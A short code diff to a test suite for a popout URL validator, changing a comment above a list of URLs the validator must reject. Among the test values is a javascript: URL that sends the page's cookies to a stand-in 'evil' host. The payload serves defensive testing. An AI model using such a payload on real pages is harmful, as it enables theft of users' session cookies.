@@ -174,7 +174,7 @@ describe('assertSameOriginPopoutUrl', () => {
 
     describe('rejects unsafe URLs', () => {
         test.each([
-            // The headline class — javascript: would execute in a context the
+            // The main case: a javascript: URL would execute in a context the
             // browser still associates with the opener.
             ['javascript:alert(1)'],
             ["javascript:fetch('https://evil/?c='+document.cookie)"],
